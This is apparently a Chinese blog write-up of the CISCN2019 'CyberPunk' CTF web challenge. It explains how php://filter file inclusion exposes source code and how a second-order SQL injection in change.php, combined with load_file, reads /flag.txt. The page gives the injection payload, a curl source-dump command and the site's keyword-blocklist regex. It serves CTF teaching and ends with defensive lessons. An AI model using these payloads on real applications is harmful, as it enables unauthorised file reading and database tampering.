---
title: CISCN2019 - Web - CyberPunk
date: 2026-11-14 18:07:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - 二次注入
  - 文件包含
  - load_file
  - addslashes绕过
  - 源码审计
cover: /img/cover/pink-hair-flower-girl.jpg
description: "源码审计加二次注入题，php://filter 读源码发现 change.php 把库里 address 原样拼进 UPDATE 绕过正则，借 prepare 存 payload 触发注入并用 load_file 读 flag.txt。"
keywords:
  - 二次注入
  - Second-order
  - load_file
  - php://filter
  - CISCN
ai: >-
  本题是 CISCN2019 华北赛区的 Web 题，由首页注释提示文件包含，用 php://filter 读出全部源码，因 file 参数过滤了 phar、zip、data 却漏了 php://filter。confirm.php 用 prepare 参数化存储 address 可存任意串；change.php 把从库读出的 address 直接拼进 UPDATE，未 addslashes 也未过关键字正则，形成二次注入。flag 不在库里，用 load_file 读 /flag.txt 得到。关键在于过滤只作用于直传字段，脏数据出库二次使用时失去保护。
copyright_author: Hunter
---

> 结论先行：`php://filter` 读源码发现 `change.php` 的 `$row['address']` 未转义未过滤；用 `prepare` 把注入 payload 存进 address，改地址时触发二次注入，配合 `load_file('/flag.txt')` 读 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN2019 |
| 方向 | Web |
| 难度 | 简单 |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：PHP 源码审计 + 二次注入（Second-order SQL Injection）。

## 信息收集

### 源码审计 / LFI

首页 `index.php` 底部有一处注释 `<!--?file=?-->`，提示存在文件包含。通过 PHP 伪协议读取源码：

```text
/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

`index.php` 源码中，`file` 参数过滤了 `phar|zip|bzip2|zlib|data|input|%00`，但 **`php://filter` 未被过滤**，因此可以读取任意 PHP 源文件。

通过 LFI 读取全部源码，关键发现：

- `config.php`：数据库连接 `root/root@127.0.0.1/ctfusers`，且 `ini_set("open_basedir", getcwd().":/etc:/tmp")`。
- `confirm.php`：插入订单时 `address` 字段使用 **`prepare` + `bind_param`**（安全的参数化查询），可存储任意内容。
- `change.php`：修改地址时存在二次注入点。

## 漏洞分析

### change.php 的二次注入点

```php
$address = addslashes($_POST["address"]);   // 新地址做了 addslashes
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
```

其中 `$row['address']` 是**从数据库读出的原始 address 值**（第一次 insert 时存入的 payload），直接拼接进 UPDATE 语句，**未经过 `addslashes` 也未经过 `$pattern` 正则过滤**。

### 过滤只作用于直传字段

各页面都有一个 `$pattern` 正则过滤：

```php
$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
```

但该过滤只作用于 `$_POST` 直接传入的 `user_name` 和 `phone`。而 `change.php` 里 `$row['address']` 来自数据库，**绕过了正则过滤**。这正是二次注入的本质：入库时看似安全，出库再拼 SQL 时失去保护。

## 利用过程

利用链分三步：

1. **第一步**：向 `confirm.php` POST，`address` 字段存入注入 payload（`prepare` 绑定参数，可存任意字符串，包括 SQL 注入代码）。
2. **第二步**：向 `change.php` POST 相同的 `user_name` + `phone`，触发 UPDATE，`old_address` 拼接进 SQL，执行注入。
3. **第三步**：向 `search.php` POST 查询，回读 `address` 字段（已被注入改写为子查询结果）。

### 读取 Flag

数据库 `ctfusers` 中只有 `user` 表（列：`user_id, address, old_address, user_name, phone`），**flag 不在数据库里**，需要读文件。

利用二次注入 + `load_file()` 读取 `/flag.txt`：

```python
payload = "x', address=(select load_file('/flag.txt'))#"
```

## 完整 EXP

复现脚本清单（见本地 WP 归档 `_cyberpunk/` 目录）：

- `recon.py`：首页信息收集
- `dump_source.py`：LFI 读取并解码全部 PHP 源码
- `loadfile.py`：二次注入 + `load_file` 读 flag（最终利用脚本）

最终利用的核心 payload：

```python
# 第一步：向 confirm.php 存入注入 payload（address 由 prepare 绑定，原样入库）
payload = "x', address=(select load_file('/flag.txt'))#"

# 第二步：用相同 user_name + phone 请求 change.php
# change.php 把库里的旧 address 拼进 UPDATE：
#   update `user` set `address`='<新地址>', `old_address`='x', address=(select load_file('/flag.txt'))#'
# 第三步：search.php 回读 address 即为 /flag.txt 内容
```

读源码命令（curl）：

```bash
curl "http://target:8080/index.php?file=php://filter/convert.base64-encode/resource=index.php"
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

| 要点 | 说明 |
|---|---|
| LFI | `index.php?file=php://filter/convert.base64-encode/resource=xxx` 读源码 |
| 二次注入 | `change.php` 的 `$row['address']` 未转义未过滤，来自 DB |
| 过滤绕过 | `$pattern` 只过滤 `$_POST` 直传字段，二次注入点天然绕过 |
| flag 位置 | 不在 DB，通过 `load_file('/flag.txt')` 读取 |

1. 参数化查询能保证「入库」安全，但数据出库后再拼进 SQL 仍可能引入注入，防护要覆盖数据的整个生命周期。
2. `open_basedir` 限制配合 `load_file` 读文件，是 SQL 注入转任意文件读取的常用手段。
3. 注释里的 `?file=?` 提示与「源码过滤了 data/input 却漏了 php://filter」是本题两个信息收集突破口。
